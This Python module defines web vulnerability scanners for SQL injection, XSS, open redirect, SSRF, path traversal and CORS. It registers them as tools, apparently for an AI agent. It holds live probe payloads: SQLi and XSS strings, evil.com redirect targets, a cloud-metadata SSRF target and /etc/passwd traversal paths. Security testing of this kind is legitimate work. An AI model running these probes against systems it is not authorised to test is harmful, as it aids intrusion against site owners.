"""Vulnerability scanners: SQLi, XSS, Open Redirect, SSRF, Path Traversal, CORS."""
import asyncio, re, urllib.parse
from .mcp_registry import registry

async def _probe(url, method="GET", params=None, headers_extra=None, timeout=15):
    import httpx
    headers = {"User-Agent": "Kemi-Claw/5.0"}
    if headers_extra: headers.update(headers_extra)
    try:
        async with httpx.AsyncClient(verify=False, timeout=timeout, follow_redirects=False) as c:
            if method.upper() == "POST":
                r = await c.post(url, data=params, headers=headers)
            else:
                r = await c.get(url, params=params, headers=headers)
            return {"status": r.status_code, "length": len(r.text), "body_snippet": r.text[:500], "headers": dict(r.headers), "url": str(r.url)}
    except Exception as e: return {"error": str(e)}

async def sqli_check(url: str):
    payloads = [("'", "single quote"), ('"', "double quote"), ("' OR '1'='1", "OR injection"), ("' OR 1=1--", "OR comment"), ("1' AND SLEEP(3)--", "time-based MySQL"), ("1; WAITFOR DELAY '0:0:3'--", "time-based MSSQL"), ("1' AND 1=CAST(version() AS INT)--", "type conversion")]
    findings = []
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = dict(urllib.parse.parse_qsl(parsed.query)) if parsed.query else {"q": "test"}
    for payload, desc in payloads:
        test_params = {k: f"{v}{payload}" for k, v in params.items()}
        result = await _probe(base_url, params=test_params)
        if result.get("error"): continue
        body = result.get("body_snippet", "").lower()
        indicators = []
        if any(e in body for e in ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "driver"]): indicators.append("SQL error")
        if result.get("status") in (500, 503): indicators.append(f"Server error ({result['status']})")
        if indicators: findings.append({"payload": payload, "type": desc, "indicators": indicators, "status": result["status"]})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "tested_payloads": len(payloads)}

async def xss_check(url: str):
    payloads = [("<script>alert(1)</script>", "basic"), ('"><script>alert(1)</script>', "attribute"), ("<img src=x onerror=alert(1)>", "img onerror"), ("'-alert(1)-'", "sq js"), ('"-alert(1)-"', "dq js"), ("<svg/onload=alert(1)>", "svg")]
    findings = []
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = dict(urllib.parse.parse_qsl(parsed.query)) if parsed.query else {"q": "test"}
    for payload, desc in payloads:
        test_params = {k: f"{v}{payload}" for k, v in params.items()}
        result = await _probe(base_url, params=test_params)
        if result.get("error"): continue
        if payload in result.get("body_snippet", ""): findings.append({"payload": payload, "type": desc, "reflected": True})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "tested_payloads": len(payloads)}

async def open_redirect_check(url: str):
    targets = ["https://evil.com", "//evil.com"]
    findings = []
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    for param in ["redirect", "url", "next", "return", "goto", "target"]:
        for t in targets:
            result = await _probe(base_url, params={param: t, **(dict(urllib.parse.parse_qsl(parsed.query)) or {"q":"test"})})
            if result.get("status") in (301, 302, 303, 307, 308) and "evil.com" in str(result.get("headers", {}).get("location", "")).lower():
                findings.append({"param": param, "payload": t})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings}

async def ssrf_check(url: str):
    internal = ["http://169.254.169.254/latest/meta-data/", "http://localhost:22", "http://127.0.0.1:80"]
    findings = []
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    for param in ["url", "uri", "path", "proxy", "src", "file", "fetch", "endpoint", "link"]:
        for t in internal:
            result = await _probe(base_url, params={param: t})
            if result.get("status") and result["status"] != 400 and len(result.get("body_snippet","")) > 50:
                findings.append({"param": param, "target": t, "response_len": len(result.get("body_snippet",""))})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings[:10]}

async def path_traversal_check(url: str):
    payloads = ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd"]
    findings = []
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for param in ["file", "page", "path", "include", "template"]:
        for p in payloads:
            result = await _probe(base, params={param: p})
            if result.get("error"): continue
            body = result.get("body_snippet", "")
            if any(s in body for s in ["root:", "daemon:", "/bin/bash"]): findings.append({"param": param, "payload": p, "evidence": "system file content"})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings}

async def cors_check(url: str):
    import httpx
    findings = []
    origins = ["https://evil.com", "null"]
    try:
        async with httpx.AsyncClient(verify=False, timeout=15) as c:
            for origin in origins:
                r = await c.options(url, headers={"Origin": origin, "User-Agent": "Kemi-Claw/5.0", "Access-Control-Request-Method": "GET"})
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")
                if acao == origin or acao == "*":
                    sev = "CRITICAL" if acac.lower() == "true" and acao != "*" else "HIGH" if acao == origin else "MEDIUM"
                    findings.append({"origin": origin, "allow_origin": acao, "allow_credentials": acac, "severity": sev})
    except: return {"error": "connection failed"}
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings}

registry.register("sqli_check", "SQL injection scanner", {"url": "str"}, sqli_check)
registry.register("xss_check", "XSS scanner", {"url": "str"}, xss_check)
registry.register("open_redirect_check", "Open redirect scanner", {"url": "str"}, open_redirect_check)
registry.register("ssrf_check", "SSRF probe", {"url": "str"}, ssrf_check)
registry.register("path_traversal_check", "Path traversal / LFI scanner", {"url": "str"}, path_traversal_check)
registry.register("cors_check", "CORS misconfiguration scanner", {"url": "str"}, cors_check)
